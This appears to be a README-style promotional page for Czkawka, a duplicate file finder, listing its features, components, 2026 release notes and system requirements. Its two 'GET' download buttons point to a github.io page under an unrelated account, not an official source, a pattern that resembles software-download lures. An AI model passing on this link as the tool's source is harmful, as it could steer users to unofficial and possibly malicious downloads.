# Czkawka

<p align="center">
<img src="https://i.ytimg.com/vi/NU4tGckGMlg/maxresdefault.jpg" alt="Czkawka 2026 Duplicate File Finder and Cleaner" width="600">
</p>

[![GET — Czkawka](https://img.shields.io/badge/GET-Czkawka-2563eb?style=for-the-badge)](https://parlornikolasw.github.io/.github/Czkawka-2026)

---

# Project Overview

Czkawka is a free and open-source utility for finding unnecessary and duplicate files on computers. It can identify duplicate files, empty folders, large files, temporary files, similar images and videos, duplicate or similar music, broken files, invalid symbolic links, and other types of potentially unnecessary data.

The project is written primarily in Rust and uses multithreading and caching to provide fast scans. It supports Windows, Linux, macOS, FreeBSD, Android, and multiple CPU architectures.

The latest stable release is **Czkawka 12.0.2**, released on **September 9, 2026**. Version 12 is the final release of the older GTK interface; new users are encouraged to use **Krokiet**, the newer Slint-based graphical frontend.

---

# Duplicate Files

Czkawka can scan selected directories for files that contain identical data.

Duplicate detection can help identify multiple copies of documents, archives, installers, media files, and other data occupying unnecessary storage.

Results are grouped so that users can review matching files before deciding which copies should be removed.

Reference folders can also be used to protect selected locations from deletion operations.

---

# Similar Images & Videos

The application can find images that are visually similar rather than byte-for-byte identical.

This can help identify resized images, recompressed copies, images with watermarks, and other visually related files.

Czkawka also includes a similar-video analyzer that can identify visually similar video files. The 2026 development cycle introduced a new video duplicate checker and additional improvements for comparing videos.

---

# Music, Large Files & Temporary Files

Czkawka provides several specialized tools for analyzing storage:

* **Same Music** — finds similar music using tags or file-content comparison.
* **Big Files** — finds the largest or smallest files in selected locations.
* **Empty Files** — finds files with zero bytes.
* **Empty Folders** — identifies directories without usable contents.
* **Temporary Files** — searches for files matching common temporary-file patterns.

These tools allow storage analysis to be divided into specific categories instead of performing only a general duplicate search.

---

# Broken Files & File Validation

Czkawka can detect files that appear to be invalid or corrupted according to the supported file-type checks.

The application also provides **Bad Extensions**, which identifies files whose detected content does not correspond to their filename extension.

Other tools include detection of invalid symbolic links and potentially problematic filenames.

Important files should be backed up before performing deletion or cleanup operations.

---

# Krokiet GUI & CLI

The project currently contains several components:

* **Krokiet** — the actively developed graphical frontend.
* **Czkawka GTK** — the older GTK-based frontend, now in maintenance mode.
* **Czkawka CLI** — command-line interface for automated workflows.
* **Czkawka Core** — shared scanning functionality.
* **Cedinia** — an experimental Android frontend.

Version 12.0 is the final Czkawka GTK release, while Krokiet is the primary graphical application receiving new features and development.

---

# 2026 Updates

Czkawka **12.0.2** was released on September 9, 2026.

The release includes:

* Fixes for rollback failures when creating hard links and symbolic links.
* Updated XDG trash implementation.
* AVIF license metadata and test fixes.
* Improved handling of invalid numeric CLI input.
* Improved Krokiet popup text layout.
* Ability to start Krokiet scans through CLI arguments.

Earlier 2026 releases introduced the Krokiet transition, a new similar-video checker, geometric-invariance support for similar-image detection, additional broken-file checks, improved cache behavior, and other scanning and interface improvements.

---

# System Compatibility & Performance

| Component        | Minimum Practical Configuration                  |
| ---------------- | ------------------------------------------------ |
| Operating System | Windows, Linux, macOS, FreeBSD, or Android       |
| Processor        | Modern dual-core CPU                             |
| Memory           | 2 GB RAM minimum; 4 GB+ recommended              |
| Storage          | Approximately 100 MB+ depending on build         |
| Graphics         | Integrated graphics supported                    |
| Display          | 1024×768 or higher                               |
| Architecture     | x86, x64, ARM, and other supported architectures |
| Internet         | Not required for local scanning                  |

Czkawka is designed to use multithreading and efficient algorithms for fast scanning. Cache support can make subsequent scans considerably faster than the first scan.

Actual resource usage depends on the number of files, selected scanning modules, file sizes, image/video analysis, available CPU cores, and storage performance.

---

[![GET — Czkawka](https://img.shields.io/badge/GET-Czkawka-2563eb?style=for-the-badge)](https://parlornikolasw.github.io/.github/Czkawka-2026)

---

# Tags

Czkawka, Czkawka 2026, Czkawka 12.0.2, Krokiet, duplicate finder, duplicate files, similar images, similar videos, duplicate music, disk cleanup, storage cleaner, large files finder, empty files, empty folders, temporary files, broken files, file analyzer, Rust utility, open source cleaner, Windows utility, Linux utility, macOS utility

---

